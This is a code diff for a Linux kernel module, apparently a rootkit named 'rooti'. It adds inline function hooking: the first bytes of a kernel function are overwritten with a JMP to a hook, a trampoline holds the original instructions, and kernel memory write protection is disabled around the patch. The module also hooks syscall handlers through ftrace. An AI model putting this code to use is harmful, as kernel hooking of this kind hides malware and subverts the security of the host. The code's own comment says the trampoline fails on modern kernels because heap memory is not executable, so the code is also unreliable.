@@ -1,6 +1,44 @@
+#include <linux/bug.h>
 #include "func.h"
 #include "utils.h"
 #include "../utils.h"
+
+void rooti_install_inline_hook(struct rooti_func_hook *hook)
+{
+    int jump_offset;
+    unsigned char patch[5];
+    unsigned char jump[5];
+
+    // this DOES NOT WORK as generic kernel memory is not executable - should be tested on older kernels
+    void *trampoline = kmalloc(10, GFP_KERNEL);
+
+    patch[0] = 0xE9;
+    jump_offset = (unsigned long)hook->func - (hook->addr + 5);
+    *(int *)(patch + 1) = jump_offset;
+
+    jump[0] = 0xE9;
+    jump_offset = (unsigned long)hook->func + 5 - ((unsigned long)trampoline + 10);
+    *(int *)(jump + 1) = jump_offset;
+
+    memcpy(trampoline + 0, (void *)hook->addr, 5);
+    memcpy(trampoline + 5, jump, 5);
+
+    hook->orig = trampoline;
+
+    rooti_unprotect_memory();
+    memcpy((void *)hook->addr, patch, 5);
+    rooti_protect_memory();
+}
+
+void rooti_uninstall_inline_hook(struct rooti_func_hook *hook)
+{
+    rooti_unprotect_memory();
+    memcpy((void *)hook->addr, hook->orig, 5);
+    rooti_protect_memory();
+
+    kfree(hook->orig);
+    hook->orig = NULL;
+}
 
 /*
     Saves a reference to the original function we hook. If the recursion protection mechanism in use
@@ -55,7 +93,7 @@ int rooti_install_func_hook(struct rooti_func_hook *hook)
     // Register the callback function
     hook->ops.func = rooti_ftrace_thunk;
     hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
-
+    
     // Set IP filter for the memory address of the original syscall handler
     ret = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
     if (ret < 0) {
